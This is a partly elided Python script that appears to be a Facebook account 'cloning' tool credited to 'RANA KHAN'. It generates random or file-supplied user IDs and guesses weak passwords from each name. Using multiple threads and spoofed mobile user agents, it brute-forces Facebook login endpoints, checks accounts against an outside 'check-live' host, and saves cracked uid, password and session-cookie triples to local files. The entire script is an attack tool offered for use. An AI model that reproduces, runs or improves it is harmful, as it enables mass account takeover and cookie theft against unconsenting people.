...
def __SEX__():
	bal = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
...
\033[1;32m 
 ...
 RANA KHAN 😈
 \033[1;37m--------------------------------------------------
 \033[1;37m[•] AUTHOR     : \033[1;32mRANA KHAN\033[1;37m
 \033[1;37m[•] GITHUB     : \033[1;32mRANA -\033[1;37m
 \033[1;37m[•] TOOL NAME  : \033[1;32mRANA\033[1;37m
...
def ___RANA___():
	...
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN SAWAR NATI");time.sleep(1);___RANA___()
#--------------------• FILE INPUT •--------------------#
def ___filex___():
	try:
...
def passwordx():
	...
	with tred(max_workers=30) as __SAMI__:
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'@123')
					pwv.append(frs+'1122')
			if 'M1' in method:__RANA__.submit(___M1___,idf,pwv)
			elif 'M2' in method:__RANA__.submit(___M2___,idf,pwv)
			else:__RANA__.submit(___M1___,idf,pwv)
#--------------------• FILE METHOD M1 •--------------------#
def ___M1___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}RANA-M1{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}RANA-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/RANA-M1-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
                ...
                print(f'\r{W}<|{G}RANA-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/RANA-M1-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
...
def ___M2___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}RANA-M2{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}RANA-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/RANA-M2-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                oks+=1
                ...
                print(f'\r{W}<|{G}RANA-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/RANA-M2-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
...
def ___Bangladesh___():
	...
	for bal in range(limit):SAMI = ''.join(random.choice(string.digits) for _ in range(8));user.append(SAMI)
...
def ___India___():
	...
	for bal in range(limit):SAMI = ''.join(random.choice(string.digits) for _ in range(7));user.append(SAMI)
	with tred(max_workers=30) as __X__:
		clear();tl = str(len(user))
		print(f"{xd} CODE{G}|{W}UID {xdxx} {code}{G}|{W}{tl} ");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
...
def __M1__(ids,pasx):
	...
	for pw in pasx:
		try:
			...
			link = ewe.get("https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {
			...
			response = ewe.post("https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				headers = headers,
			...
			if "checkpoint" in ewe.cookies.get_dict():
				...
				print(f'\r{W}<|{R}RANA-CP{W}|>{R} {uid} | {pw} ')
				cps+=1
				open('/sdcard/RANA-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
				break
				...
				if "LIVE" in response:
					print(f'\r{W}<|{G}RANA-OK{W}|>{G} {uid} | {pw} ')
					#print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
					oks+=1
					open('/sdcard/RANA-M1-RANDOM-OK-COKIE.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
					break
				else:continue
        ...
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                ...
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{W}<|{G}RANA-OK{W}|>{G} {str(uid)} | {pas} ')
                                	print(f'\r{W}<|{G}COOKIES{W}|>{W} {coki} ');linex()
                                	open('/sdcard/RANA-M2-RANDOM-OK-COKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	oks.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{W}<|{R}RANA-CP{W}|>{R} {str(uid)} | {pas} ')
                                print(f'\r{W}<|{G}COOKIES{W}|>{W} {coki} ');linex()
                                open('/sdcard/RANA-M2-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
